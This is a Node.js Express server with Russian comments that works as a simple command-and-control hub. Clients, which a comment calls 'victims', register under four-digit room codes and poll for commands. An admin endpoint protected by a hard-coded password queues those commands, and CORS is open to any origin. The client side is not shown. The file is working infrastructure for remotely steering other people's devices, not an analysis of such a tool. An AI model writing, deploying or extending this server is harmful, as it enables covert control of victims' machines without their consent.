const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Пароль администратора
const ADMIN_PASSWORD = '7355608';

// Хранилище: roomCode -> { commands: [], lastPoll: timestamp }
const rooms = new Map();

// Разрешаем CORS (чтобы запросы с GitHub Pages проходили)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());

// Проверка работы сервера
app.get('/', (req, res) => {
  res.send('Сервер управления работает!');
});

// Клиент (жертва) регистрируется и начинает ждать команды
app.post('/api/client/register', (req, res) => {
  const { room } = req.body;
  if (!room || room.length !== 4 || !/^\d+$/.test(room)) {
    return res.status(400).json({ error: 'Неверный код комнаты' });
  }

  if (!rooms.has(room)) {
    rooms.set(room, { commands: [], lastPoll: Date.now() });
  }
  // Просто подтверждаем регистрацию, очередь команд уже есть
  res.json({ status: 'registered' });
});

// Клиент опрашивает сервер на наличие команд
app.get('/api/client/poll', (req, res) => {
  const { room } = req.query;
  if (!room || !rooms.has(room)) {
    return res.status(404).json({ error: 'Комната не найдена' });
  }

  const roomData = rooms.get(room);
  roomData.lastPoll = Date.now();

  // Если есть команды, отправляем первую и удаляем её из очереди
  if (roomData.commands.length > 0) {
    const command = roomData.commands.shift();
    return res.json({ command });
  }

  // Нет команд — возвращаем пустой ответ, клиент продолжит опрос
  res.json({ command: null });
});

// Администратор отправляет команду
app.post('/api/admin/command', (req, res) => {
  const { room, password, command } = req.body;
  if (password !== ADMIN_PASSWORD) {
    return res.status(403).json({ error: 'Неверный пароль' });
  }
  if (!room || !rooms.has(room)) {
    return res.status(404).json({ error: 'Комната не найдена' });
  }
  if (!command) {
    return res.status(400).json({ error: 'Нет команды' });
  }

  const roomData = rooms.get(room);
  roomData.commands.push(command);
  res.json({ status: 'ok' });
});

// Периодическая очистка старых комнат (например, раз в час)
setInterval(() => {
  const now = Date.now();
  for (let [room, data] of rooms.entries()) {
    if (now - data.lastPoll > 10 * 60 * 1000) { // 10 минут бездействия
      rooms.delete(room);
      console.log(`Комната ${room} удалена за неактивностью`);
    }
  }
}, 60 * 1000); // проверка раз в минуту

app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});
